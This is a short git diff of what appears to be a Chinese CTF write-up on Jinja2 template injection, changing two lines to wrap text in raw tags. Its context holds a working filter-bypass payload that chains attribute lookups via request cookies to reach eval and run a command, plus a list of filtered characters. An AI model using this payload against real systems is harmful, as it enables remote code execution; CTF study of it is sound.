@@ -59,7 +59,7 @@ cookie: class=__class__;base=__base__;subclasses=__subclasses__;getitem=__getite
 
 ## 368
 
-{{被过滤
+  {% raw %}  {{被过滤  {% endraw %} 
 
 ```python
 {%print(()|attr(request.cookies.class)|attr(request.cookies.base)|attr(request.cookies.subclasses)()|attr(request.cookies.getitem)(191)|attr(request.cookies.init)|attr(request.cookies.globals)|attr(request.cookies.getitem)(request.cookies.builtins)|attr(request.cookies.getitem)(request.cookies.eval)(request.cookies.command))%}
@@ -68,7 +68,7 @@ cookie: class=__class__;base=__base__;subclasses=__subclasses__;getitem=__getite
 
 ## 369
 
-过滤有点多,过滤了: _ [] ' " {{ request args os
+ {% raw %}  过滤有点多,过滤了: _ [] ' " {{ request args os  {% endraw %} 
 
 参考y1ng师傅https://www.gem-love.com/ctf/2598.html这个构造字符的技巧
 
